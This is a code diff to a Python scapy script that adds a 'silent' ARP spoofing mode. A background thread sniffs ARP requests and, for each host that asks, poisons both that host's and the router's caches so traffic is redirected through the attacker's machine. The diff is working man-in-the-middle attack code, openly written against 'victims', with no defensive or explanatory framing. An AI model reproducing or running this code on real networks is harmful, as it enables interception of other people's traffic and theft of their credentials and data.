@@ -105,6 +105,36 @@ def arp_prep_automated(subnet, iface_ = "enp0s10") :
     
     print("Victims: ", str(victim_addresses))
 
+arp_scouting_thread = None
+arp_scouting = True
+def arp_prep_silent(input_iface):
+    global IFACE, ATTACKER_IP, ATTACKER_MAC, arp_scouting_thread
+    IFACE = input_iface
+    ATTACKER_IP = scapy.get_if_addr(IFACE)
+    ATTACKER_MAC = scapy.get_if_hwaddr(IFACE)
+
+    arp_scouting_thread = threading.Thread(target=arp_silent)
+    arp_scouting_thread.daemon = True
+    arp_scouting_thread.start()
+    return
+
+def arp_silent():
+    while arp_scouting:
+        scapy.sniff(prn=arp_scout_callback, store=0, iface=IFACE)
+
+def arp_scout_callback(packet):
+    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 1:
+        ip = packet[scapy.ARP].psrc
+        mac = packet[scapy.ARP].hwsrc
+        
+        #wait a bit to overwrite original request
+        time.sleep(0.1)
+        arp_spoof(ip, router_ip)
+        arp_spoof(router_ip, ip)
+    return
+
+    
+
 def arp_tick():
     for victim_ip, victim_mac in victim_addresses.items():
             arp_spoof(victim_ip, router_ip) #send to victim that we are router
